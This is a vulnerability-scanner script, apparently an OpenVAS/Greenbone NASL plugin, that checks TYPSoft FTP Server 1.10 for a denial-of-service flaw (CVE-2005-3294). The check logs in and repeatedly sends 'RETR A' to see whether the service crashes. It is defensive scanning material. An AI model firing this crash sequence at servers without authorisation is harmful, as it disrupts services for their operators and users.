if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801687" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)" );
	script_cve_id( "CVE-2005-3294" );
	script_bugtraq_id( 15104 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/17196" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15860/" );
	script_xref( name: "URL", value: "http://www.exploitlabs.com/files/advisories/EXPL-A-2005-016-typsoft-ftpd.txt" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/typsoft/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause
  a denial of service." );
	script_tag( name: "affected", value: "TYPSoft FTP Server Version 1.10." );
	script_tag( name: "insight", value: "The flaw is due to an error in handling the RETR command,
  which can  be exploited to crash the FTP service by sending multiple RETR commands." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running TYPSoft FTP Server and is prone to denial
  of service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "TYPSoft FTP Server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc, user: user, pass: pass );
if(login_details){
	for(i = 0;i < 5;i++){
		response = ftp_send_cmd( socket: soc, cmd: "RETR A" );
		if(!response){
			security_message( port: ftpPort );
			exit( 0 );
		}
	}
}
ftp_close( socket: soc );

